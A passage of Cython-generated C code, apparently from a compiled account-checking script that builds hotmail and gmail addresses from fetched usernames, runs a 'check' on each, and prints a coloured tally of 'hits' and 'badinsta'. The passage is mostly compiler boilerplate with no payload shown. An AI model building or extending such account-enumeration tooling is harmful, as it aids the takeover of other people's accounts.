        if (__Pyx_PyFastCFunction_Check(__pyx_t_6)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_n_u_user, __pyx_t_2};
          __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 732, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        } else
        #endif
        {
          __pyx_t_4 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 732, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_11); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_11); __pyx_t_11 = NULL;
          }
          __Pyx_INCREF(__pyx_n_u_user);
          __Pyx_GIVEREF(__pyx_n_u_user);
          PyTuple_SET_ITEM(__pyx_t_4, 0+__pyx_t_10, __pyx_n_u_user);
          __Pyx_GIVEREF(__pyx_t_2);
          PyTuple_SET_ITEM(__pyx_t_4, 1+__pyx_t_10, __pyx_t_2);
          __pyx_t_2 = 0;
          __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_4, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 732, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 732, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_5 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_1, __pyx_n_u_username) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_n_u_username);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 732, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_username, __pyx_t_5);
        __pyx_t_5 = 0;

        
        __pyx_t_5 = PyNumber_Add(__pyx_v_username, __pyx_kp_u_hotmail_com); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 733, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = PyNumber_Add(__pyx_v_username, __pyx_kp_u_gmail_com); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 733, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 733, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GIVEREF(__pyx_t_5);
        PyList_SET_ITEM(__pyx_t_1, 0, __pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_6);
        PyList_SET_ITEM(__pyx_t_1, 1, __pyx_t_6);
        __pyx_t_5 = 0;
        __pyx_t_6 = 0;
        __Pyx_XDECREF_SET(__pyx_v_emails, ((PyObject*)__pyx_t_1));
        __pyx_t_1 = 0;

        
        __pyx_t_1 = __pyx_v_emails; __Pyx_INCREF(__pyx_t_1); __pyx_t_12 = 0;
        for (;;) {
          if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_1)) break;
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_6 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_12); __Pyx_INCREF(__pyx_t_6); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 734, __pyx_L5_error)
          #else
          __pyx_t_6 = PySequence_ITEM(__pyx_t_1, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 734, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_6);
          #endif
          __Pyx_XDECREF_SET(__pyx_v_email, __pyx_t_6);
          __pyx_t_6 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_check); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 735, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_4 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_5, function);
            }
          }
          __pyx_t_6 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_email);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 735, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

          
        }
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
      }
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      goto __pyx_L12_try_end;
      __pyx_L5_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
      if (__pyx_t_10) {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L6_exception_handled;
      }
      goto __pyx_L7_except_error;
      __pyx_L7_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
      goto __pyx_L1_error;
      __pyx_L6_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
      __pyx_L12_try_end:;
    }
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_AddTraceback("source.eizon", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XDECREF(__pyx_v_emails);
  __Pyx_XDECREF(__pyx_v_email);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_27pppp(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_27pppp = {"pppp", (PyCFunction)__pyx_pw_6source_27pppp, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_27pppp(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("pppp (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_26pppp(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_26pppp(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  Py_ssize_t __pyx_t_4;
  Py_UCS4 __pyx_t_5;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("pppp", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 745, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 745, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_n_u_clear) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_u_clear);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 745, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyTuple_New(46); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = 0;
  __pyx_t_5 = 127;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_white); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__56);
  __pyx_t_5 = (65535 > __pyx_t_5) ? 65535 : __pyx_t_5;
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__56);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_kp_u__56);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_green); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__56);
  __pyx_t_5 = (65535 > __pyx_t_5) ? 65535 : __pyx_t_5;
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__56);
  PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_kp_u__56);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_B6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__56);
  __pyx_t_5 = (65535 > __pyx_t_5) ? 65535 : __pyx_t_5;
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__56);
  PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_kp_u__56);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_cyan); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__56);
  __pyx_t_5 = (65535 > __pyx_t_5) ? 65535 : __pyx_t_5;
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__56);
  PyTuple_SET_ITEM(__pyx_t_1, 7, __pyx_kp_u__56);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_red); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 8, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__56);
  __pyx_t_5 = (65535 > __pyx_t_5) ? 65535 : __pyx_t_5;
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__56);
  PyTuple_SET_ITEM(__pyx_t_1, 9, __pyx_kp_u__56);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_DY6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 10, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__57);
  __pyx_t_5 = (65535 > __pyx_t_5) ? 65535 : __pyx_t_5;
  __pyx_t_4 += 19;
  __Pyx_GIVEREF(__pyx_kp_u__57);
  PyTuple_SET_ITEM(__pyx_t_1, 11, __pyx_kp_u__57);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_cyan); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 12, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__58);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 3;
  __Pyx_GIVEREF(__pyx_kp_u__58);
  PyTuple_SET_ITEM(__pyx_t_1, 13, __pyx_kp_u__58);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_white); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 14, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__59);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 4;
  __Pyx_GIVEREF(__pyx_kp_u__59);
  PyTuple_SET_ITEM(__pyx_t_1, 15, __pyx_kp_u__59);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_white); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 16, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__60);
  __pyx_t_4 += 4;
  __Pyx_GIVEREF(__pyx_kp_u__60);
  PyTuple_SET_ITEM(__pyx_t_1, 17, __pyx_kp_u__60);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_green); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 18, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_hits); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 19, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u_);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u_);
  PyTuple_SET_ITEM(__pyx_t_1, 20, __pyx_kp_u_);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_cyan); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 21, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__58);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 3;
  __Pyx_GIVEREF(__pyx_kp_u__58);
  PyTuple_SET_ITEM(__pyx_t_1, 22, __pyx_kp_u__58);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_white); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 23, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__61);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 12;
  __Pyx_GIVEREF(__pyx_kp_u__61);
  PyTuple_SET_ITEM(__pyx_t_1, 24, __pyx_kp_u__61);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_red); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 25, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_badinsta); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 26, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u_);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u_);
  PyTuple_SET_ITEM(__pyx_t_1, 27, __pyx_kp_u_);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_cyan); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 747, __pyx_L1_error)
